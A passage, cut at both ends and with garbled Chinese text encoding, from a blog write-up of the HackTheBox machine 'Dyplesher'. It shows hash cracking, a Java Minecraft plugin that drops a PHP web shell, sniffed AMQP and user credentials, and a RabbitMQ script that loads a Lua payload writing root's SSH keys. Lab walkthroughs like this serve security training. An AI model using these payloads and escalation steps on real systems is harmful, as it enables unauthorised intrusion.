class="line">./@hashed/4b/22/4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a.bundle</span><br><span class="line">./@hashed/d4</span><br><span class="line">./@hashed/d4/73</span><br><span class="line">./@hashed/d4/73/d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35.bundle</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰<code>.bundle</code>æ–‡ä»¶ã€‚æˆ‘ä»¬å•ç‹¬æ‹¿å‡ºæ¥å¹¶git cloneã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(find ../repositories | grep bundle)</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">        git <span class="built_in">clone</span> <span class="variable">$i</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>bundle cloneå®Œåçš„å†…å®¹å°±æœ‰ç‚¹å¤šäº†ã€‚åŒæ ·ç®€å•çœ‹ä¸‹å››ä¸ªä»“åº“çš„å†…å®¹,æœ‰çš„æ˜¯è·Ÿmcæœ‰å…³ã€‚æœ‰çš„æ˜¯phpbashshellæœ‰å…³ã€‚å†æ¬¡findä¸‹æ‰¾åˆ°ä¸€ä¸ªsqliteçš„dbæ–‡ä»¶users.dbã€‚ç›´æ¥è¿›å…¥db.<code>select * from users.</code><br>å¾—åˆ°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">18fb40a5c8d34f249bb8a689914fcac3|$2a$10$IRgHi7pBhb9K0QBQBOzOju0PyOZhBnK4yaWjeZYdeP6oyDvCo9vc6|7|&#x2F;192.168.43.81</span><br></pre></td></tr></table></figure><p>åˆæ˜¯ä¸€ä¸ªbcryptå¯†ç ã€‚å†åº¦hashcatç ´è§£å¾—åˆ°<code>alexis1</code></p><p>è¿™æ¬¡æˆ‘ä»¬ç»ˆäºèƒ½ç™»å½•è¿›80ç«¯å£çš„é¡µé¢äº†ã€‚è¿›å…¥åå‘ç°æ˜¯ä¸€ä¸ªæ§åˆ¶å°ã€‚é‡Œé¢æ˜¾ç¤ºçš„æ˜¯mcä¿¡æ¯ã€‚ç„¶ååŠŸèƒ½åŒ…æ‹¬ä¸Šä¼ pluginè·Ÿé‡æ–°åŠ è½½æŒ‡å®šplugin.</p><p>emmè™½ç„¶æ²¡ç©è¿‡æ­£ç‰ˆmcä½†æ˜¯è‡³å°‘çŸ¥é“å®ƒæ˜¯javaå†™çš„ã€‚æˆ‘åœ¨ç½‘ä¸Šæ‰¾äº†ä¸‹å‘ç°æœ‰éå¸¸å…¨é¢çš„æŒ‡å—ã€‚æ„Ÿè§‰å°±ç®—ä¸ä¼šjavaçš„äººä¹Ÿèƒ½è·Ÿç€åšäº†ã€‚å½“ç„¶è¿™é‡Œæˆ‘åˆšå¥½å‰ä¸€å¤©ç®€å•å­¦ä¹ äº†ä¸‹<a href="https://bycsec.top/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/#maven" target="_blank" rel="noopener">maven</a>çš„ä½¿ç”¨ã€‚æ‰€ä»¥å°±ideaç›´æ¥ä¸Šæ‰‹mavené¡¹ç›®ã€‚</p><p>å…·ä½“å‚è€ƒ<a href="https://www.spigotmc.org/wiki/creating-a-plugin-with-maven-using-intellij-idea/" target="_blank" rel="noopener">è¿™ç¯‡æ–‡ç« </a>,æˆ‘å°±ç®€å•åšä¸‹è§£é‡Š,å½“åšideaå­¦ä¹ ç¬”è®°äº†ã€‚</p><p>é¦–å…ˆæ˜¯pom.xmlé…ç½®</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>top.bycsec<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>java_mc_exp<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.encoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">maven.compiler.encoding</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>10<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>10<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>10<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">repositories</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">repository</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>spigotmc-repo<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span>&gt;</span>https://hub.spigotmc.org/nexus/content/repositories/snapshots/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">repository</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">repositories</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.spigotmc<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spigot-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.16.1-R0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><p>groupIDè¿™ç§å»ºé¡¹ç›®å‰å°±åº”è¯¥å·²ç»è®©æˆ‘ä»¬è‡ªå·±é…ç½®å¥½äº†ã€‚æˆ‘æŒ‰ç…§æ­£å¸¸æ ‡å‡†å®šä¸º<code>top.bycsec</code>.ç„¶åä¸‹é¢propertiesçš„è®¾å®šæ˜¯ä¸€ä¸ªå°å‘ã€‚å› ä¸ºè‡ªå·±ideaçš„jdkç‰ˆæœ¬è·Ÿç³»ç»Ÿä¸ä¸€è‡´,ç„¶åè¿˜æœ‰ç³»ç»Ÿçš„è¯­è¨€levelæ°´å¹³ç­‰ç­‰é—®é¢˜ã€‚å¯¼è‡´mavenç¼–è¯‘æ—¶ä¼šå‡ºç°æŠ¥é”™â€ä¸æ”¯æŒå‘è¡Œç‰ˆæœ¬5â€.ç»å¸¸æ”¹å®Œäº†é…ç½®è¿˜æ˜¯æŠ¥é”™ã€‚è§£å†³æ–¹æ³•åªæœ‰åƒä¸Šé¢é‚£æ ·æŒ‰ç…§è‡ªå·±çš„æ ‡å‡†é…ç½®pom.xmlæ‰èƒ½é¿å…æŠ¥é”™ã€‚</p><p>ä¸‹é¢çš„ä»“åº“æ˜¯spigot ç»™mcç”¨çš„mavenä»“åº“ã€‚æˆ‘ä»¬ä¼šç”¨åˆ°çš„spigot-apiå¾—å»å¯¹åº”çš„ä»“åº“ä¸‹è½½ã€‚</p><p>ç„¶åæœ€ç»ˆå®Œæ•´çš„ç›®å½•ç»“æ„å¦‚ä¸‹ã€‚<br><img src="/2020/07/24/hackthebox-Dyplesher/1.5.PNG" class="lazyload" data-srcset="1.5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>resourceså³å¤–éƒ¨èµ„æºåŒ…ä¸­éœ€è¦<code>plugin.yml</code>æ¥æŒ‡å®špluginä¿¡æ¯ã€‚è¿™é‡Œéå¸¸é‡è¦ã€‚å› ä¸ºæˆ‘ä»¬åé¢è¦ç”¨åˆ°pluginçš„å‘½å­—ã€‚å…¶ä¸­ä¼¼ä¹ä¸èƒ½åŒ…å«<code>_</code>è¿™æ ·çš„å­—ç¬¦ã€‚æ‰€ä»¥ç›´æ¥å–ä¸€ä¸ªæ­£å¸¸çš„åå­—ã€‚</p><p>ç„¶åæ˜¯mainä¸‹ç¼–å†™ã€‚è¿™é‡Œæˆ‘ä»¬å› ä¸ºä¸æ˜¯ç”¨çš„mvnåˆ›å»ºçš„,æ˜¯ä¸ä¼šæŒ‡å®šåŒ…çš„ã€‚æ‰€ä»¥æˆ‘ä»¬è‡ªå·±å»ºä¸ªåŒ…<code>top.bycsec.plugin</code>å¹¶æ–°å»º<code>PluginExp</code>ä½œä¸ºè¦åŠ è½½çš„ä¸»ç±»ã€‚åŒæ—¶plugin.ymlä¸­ä¹Ÿå°†è¿™ä¸ªç±»æŒ‡å®šä¸ºåŠ è½½çš„ä¸»ç±»ã€‚</p><p>æ¥ä¸‹æ¥æ˜¯åˆ©ç”¨ç±»çš„ç¼–å†™</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.bycsec.plugin;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.bukkit.plugin.java.JavaPlugin;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PluginExp</span> <span class="keyword">extends</span> <span class="title">JavaPlugin</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onEnable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> String code=<span class="string">"&lt;?php @system($_REQUEST[byc]);?&gt;"</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            File file = <span class="keyword">new</span> File(<span class="string">"/var/www/html/bycshell.php"</span>);</span><br><span class="line">            <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">                File dir = <span class="keyword">new</span> File(file.getParent());</span><br><span class="line">                dir.mkdirs();</span><br><span class="line">                file.createNewFile();</span><br><span class="line">            &#125;</span><br><span class="line">            FileOutputStream outStream = <span class="keyword">new</span> FileOutputStream(file);</span><br><span class="line">            outStream.write(code.getBytes());</span><br><span class="line">            outStream.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">super</span>.onEnable();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onDisable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onDisable();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆæ³¨æ„æ’ä»¶ç±»å¿…é¡»ç»§æ‰¿JavaPluginã€‚è¿™ä¸ªmavenä¸‹è½½ä¾èµ–æ—¶ä¼šå¸®æˆ‘ä»¬ä¸‹å¥½ã€‚ç„¶ååªéœ€é‡å†™ä¸¤ä¸ªæ–¹æ³•å³å¯ã€‚æˆ‘ä»¬ä½¿ç”¨onEnableæ’å…¥æ¶æ„ä»£ç ,è¿™æ ·å°±å¯ä»¥åœ¨æ’ä»¶ç”Ÿæ•ˆæ—¶ç›´æ¥æ‰§è¡Œã€‚</p><p>è¿™é‡Œé€‰æ‹©å†™å…¥webshellåŸå› æœ‰ç‚¹å¤šã€‚é¦–å…ˆé¢˜ç›®é¶æœºå±…ç„¶æ˜¯ä¸é€šå¤–ç½‘çš„ã€‚è¿™ä¸ªæˆ‘çœŸæ²¡æƒ³åˆ°ã€‚å…¶æ¬¡javaé¡¹ç›®å¤§å¤šé…ç½®å¥½äº†ä¸€äº›ç¦æ­¢ç±»ã€‚runtimeå¾ˆæœ‰å¯èƒ½æ˜¯è¡Œä¸é€šçš„ã€‚æ‰€ä»¥æˆ‘é€‰æ‹©ç›´æ¥å†™å…¥webshell(çŒœäº†ä¸€æ‰‹laravelå¯¹åº”çš„å°±æ˜¯htmlæ–‡ä»¶å¤¹è€Œä¸æ˜¯dyplesher.htb)</p><p>æœ€åå®Œæˆåæˆ‘ä»¬ä½¿ç”¨mavenç¼–è¯‘æ‰“åŒ…ã€‚ç›´æ¥åŒå‡»å³è¾¹mavençš„ç”Ÿå‘½å‘¨æœŸä¸­çš„packageå³å¯åˆ›å»ºå¯¹åº”jar file.<br><img src="/2020/07/24/hackthebox-Dyplesher/1.5.5.PNG" class="lazyload" data-srcset="1.5.5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å›åˆ°ç½‘é¡µä¸Šä¼ pluginå¹¶ä½¿ç”¨pluginåbyc404 reload.<br><img src="/2020/07/24/hackthebox-Dyplesher/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å†™å…¥webshell.</p><p>ç„¶ååˆ°è¿™ä¸€æ­¥åæ‰çœŸæ­£æ„è¯†åˆ°é¶æœºä¸é€šå¤–ç½‘ã€‚æ‰€ä»¥å¸¸è§„å¼¹shellä¸å¯è¡Œã€‚åªèƒ½å°è¯•å†™å…¥sshå…¬é’¥ã€‚<br><img src="/2020/07/24/hackthebox-Dyplesher/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æˆåŠŸç™»é™†ã€‚<br><img src="/2020/07/24/hackthebox-Dyplesher/4.PNG" class="lazyload" data-srcset="4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å°ç»“ä¸‹ã€‚è¿™ä¸€éƒ¨åˆ†éš¾åº¦å…¶å®è¿˜å¥½ã€‚ä¸»è¦æ—¶é—´éƒ½èŠ±åœ¨çˆ†ç ´å¯†ç ä»¥åŠç¼–å†™javaçš„expæ—¶è¢«ideaçš„æŠ¥é”™ç»™å›°æ‰°äº†ä¸€å°ä¼šä¸Šäº†ã€‚ä½†æ˜¯è€å®è¯´ç¡®å®æ²¡æœ‰ä»€ä¹ˆéš¾åº¦ã€‚æ­£å¥½è®©è‡ªå·±æŠŠåˆšå­¦çš„mavenå·©å›ºäº†ä¸€ä¸‹ã€‚ä¸€ä¸¾ä¸¤å¾—ã€‚</p><h2 id="privesc-to-user"><a href="#privesc-to-user" class="headerlink" title="privesc to user"></a>privesc to user</h2><p>ç®€å•çœ‹ä¸‹useræ–‡ä»¶å¤¹ä¸‹æœä¸å…¶ç„¶è¿˜æœ‰<code>yuntao</code>è·Ÿ<code>felamos</code>ä¸¤ä¸ªç”¨æˆ·</p><p>æ¥ä¸‹æ¥åœ¨ä½¿ç”¨MinatoTWçš„idæ—¶å‘ç°ä¸€ä¸ªé‡è¦ä¿¡æ¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid&#x3D;1001(MinatoTW) gid&#x3D;1001(MinatoTW) groups&#x3D;1001(MinatoTW),122(wireshark)</span><br></pre></td></tr></table></figure><p>MinatoTWæ˜¯wiresharkç”¨æˆ·ç»„çš„ã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥ç”¨é¶æœºä¸Šçš„wiresharkæŠ“åŒ…ã€‚ç¡®è®¤äº†ä¸‹ç½‘å¡åº”è¯¥æ˜¯lo.(loä»£è¡¨127.0.0.1ï¼Œå³localhost)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -i lo -F pcap -w byc.pcap</span><br></pre></td></tr></table></figure><p>æŠ“ä¸€æ®µæ—¶é—´çš„åŒ…åç”¨wiresharkæ‰“å¼€åˆ†æ.è·Ÿä¸‹tcpæµ</p><p>å¾ˆå¿«å°±èƒ½æŠ“åˆ°å…³é”®ä¿¡æ¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AMQPLib.platformS....PHP.versionS....2.11.1.informationS....    copyrightS.....capabilitiesF.....authentication_failure_closet..publisher_confirmst..consumer_cancel_notifyt..exchange_exchange_bindingst.</span><br><span class="line">basic.nackt..connection.blockedt..AMQPLAIN...,.LOGINS....yuntao.PASSWORDS...</span><br><span class="line">EashAnicOc3Op.en_US.</span><br></pre></td></tr></table></figure><p>è¿™ä¸€æ®µä¼¼ä¹æ˜¯AMQPçš„é€šä¿¡å†…å®¹ã€‚å…¶ä¸­æœ‰ä¸€ç»„ç”¨æˆ·å¯†ç <code>yuntao:EashAnicOc3Op</code></p><p>å¹¶ä¸”ç´§æ¥ç€ä¸‹é¢å°±æœ‰å¤šç»„ç”¨æˆ·ä¿¡æ¯ã€‚ä¼¼ä¹æ¥è‡ªäºmc<br><img src="/2020/07/24/hackthebox-Dyplesher/5.PNG" class="lazyload" data-srcset="5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#123;<span class="attr">"name"</span>:<span class="string">"MinatoTW"</span>,<span class="attr">"email"</span>:<span class="string">"MinatoTW@dyplesher.htb"</span>,<span class="attr">"address"</span>:<span class="string">"India"</span>,<span class="attr">"password"</span>:<span class="string">"bihys1amFov"</span>,<span class="attr">"subscribed"</span>:<span class="literal">true</span>&#125;</span><br><span class="line">&#123;<span class="attr">"name"</span>:<span class="string">"yuntao"</span>,<span class="attr">"email"</span>:<span class="string">"yuntao@dyplesher.htb"</span>,<span class="attr">"address"</span>:<span class="string">"Italy"</span>,<span class="attr">"password"</span>:<span class="string">"wagthAw4ob"</span>,<span class="attr">"subscribed"</span>:<span class="literal">true</span>&#125;</span><br><span class="line">&#123;<span class="attr">"name"</span>:<span class="string">"felamos"</span>,<span class="attr">"email"</span>:<span class="string">"felamos@dyplesher.htb"</span>,<span class="attr">"address"</span>:<span class="string">"India"</span>,<span class="attr">"password"</span>:<span class="string">"tieb0graQueg"</span>,<span class="attr">"subscribed"</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure><p>ç»æµ‹è¯•å‘ç°è¿™ä¸‰ç»„å¯†ç å‡ä¸ºç³»ç»Ÿç”¨æˆ·å¯†ç ã€‚<br>suåå³å¯åœ¨felamosæ–‡ä»¶å¤¹ä¸‹æ‹¿åˆ°user.txt</p><h2 id="privesc-to-root"><a href="#privesc-to-root" class="headerlink" title="privesc to root"></a>privesc to root</h2><p>æ¥ä¸‹æ¥åœ¨felamosæœ‰ä¸€ä¸ªyuntaoçš„æ–‡ä»¶å¤¹ã€‚é‡Œé¢å†™ç€send.sh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'Hey yuntao, Please publish all cuberite plugins created by players on plugin_data "Exchange" and "Queue". Just send url to download plugins and our new code will review it and working plugins will be added to the server.'</span> &gt;  /dev/pts/&#123;&#125;</span><br></pre></td></tr></table></figure><p>cuberite plugins æ˜¯ä»¥luaè¯­è¨€ç¼–å†™çš„æ’ä»¶ã€‚è€Œè¿™é‡Œçš„ä¿¡æ¯ä¼¼ä¹åœ¨æç¤ºæˆ‘ä»¬å¯ä»¥ç¼–å†™æ¶æ„luaæ’ä»¶æ¥è¿›è¡Œprivesc.å¹¶ä¸”æç¤ºè¯´åªè¦æä¾›luaçš„urlåœ°å€å°±å¯ä»¥å°†æ’ä»¶åŠ å…¥æœåŠ¡ã€‚</p><p>â€œExchangeâ€ and â€œQueueâ€ çš„å«ä¹‰åœ¨æˆ‘è¿›è¡Œäº†ä¸€äº›ç®€å•çš„enumåå‘ç°åº”è¯¥æ˜¯AMQPæ‰€ç”¨åˆ°çš„ã€‚ç”±äºæˆ‘ä»¬ä¸€å¼€å§‹å°±å‘ç°AMQPç«¯å£æ˜¯å¯¹å¤–çš„,è€Œä¸”åˆšåˆšwiresharkæŠ“åˆ°äº†ä¸€ç»„yuntaoçš„è´¦æˆ·è¿˜æ²¡ç”¨ä¸Šã€‚æå¤§å¯èƒ½å°±æ˜¯åˆ©ç”¨amqpå»è¿›è¡Œé€šä¿¡åŠ è½½luaæ’ä»¶ã€‚</p><p>è¿™é‡Œé¶æœºä¸Šè·‘ç€çš„æ˜¯RabbitMQ.è€ŒRabbitMQé»˜è®¤æ˜¯rootæƒé™è·‘çš„ã€‚å¹¶ä¸”æˆ‘ä»¬å¯ä»¥åœ¨é¶æœºä¸Šæ‰¾åˆ°è¿è¡Œä¿¡æ¯ã€‚</p><p>æˆ‘ä»¬çœ‹çœ‹ä¸€å¥— MQ å®Œæ•´æµç¨‹æ˜¯ä»€ä¹ˆæ ·çš„ï¼š</p><p>é¦–å…ˆå°† RabbitMQ æœåŠ¡å¯åŠ¨</p><p>Producer</p><p>1ã€åˆ›å»ºä¸€ä¸ª connection<br>2ã€åœ¨ connection åŸºç¡€ä¸Šåˆ›å»ºä¸€ä¸ªé¢‘é“ channel<br>3ã€åœ¨é¢‘é“ channel ä¸Šå£°æ˜ä¸€ä¸ª exchangeï¼Œå‚æ•°ä¸º exchange çš„ç±»å‹å’Œåç§°<br>4ã€åœ¨é¢‘é“ channel ä¸Šå‘å¸ƒæ¶ˆæ¯ï¼Œå‚æ•°ä¸º exchange çš„åç§°ä»¥åŠè·¯ç”± (routing_key) ä»¥åŠæ¶ˆæ¯ä½“<br>5ã€å…³é—­ connection</p><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥æ¨æµ‹å‰é¢çš„æç¤ºä¸­<code>plugin_data</code>å¯èƒ½å°±æ˜¯è·¯ç”±ã€‚è€Œæˆ‘ä»¬è¦ä¼ é€’çš„æ¶ˆæ¯ä½“å°±æ˜¯luaçš„url.æ¥ä¸‹æ¥æˆ‘ä»¬ä½¿ç”¨python çš„pikaè¿›è¡Œç¼–å†™</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pika</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">creds=pika.PlainCredentials(<span class="string">'yuntao'</span>,<span class="string">'EashAnicOc3Op'</span>)</span><br><span class="line">params=pika.Connectionparams(<span class="string">'10.10.10.190'</span>,<span class="number">5672</span>,<span class="string">'/'</span>,creds)</span><br><span class="line">conn=pika.BlockingConnection(params)</span><br><span class="line"></span><br><span class="line">channel = conn.channel()</span><br><span class="line">channel.basic_publish(exchange=<span class="string">''</span>, routing_key=<span class="string">'plugin_data'</span>,body=<span class="string">"http://127.0.0.1:9001/exp.lua"</span>)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure><p>ç„¶åå‡†å¤‡ä¸€ä¸ªæ¶æ„çš„luaè„šæœ¬ã€‚ç”±äºluaåå¼¹shellæˆ‘å‘ç°ä¼¼ä¹éƒ½æ˜¯ä¸äº¤äº’çš„ï¼Œæ‰€ä»¥é€‰æ‹©å†™ssh key</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">f=<span class="built_in">io</span>.<span class="built_in">open</span>(<span class="string">"/root/.ssh/authorized_keys"</span>, <span class="string">"w"</span>)</span><br><span class="line">f:<span 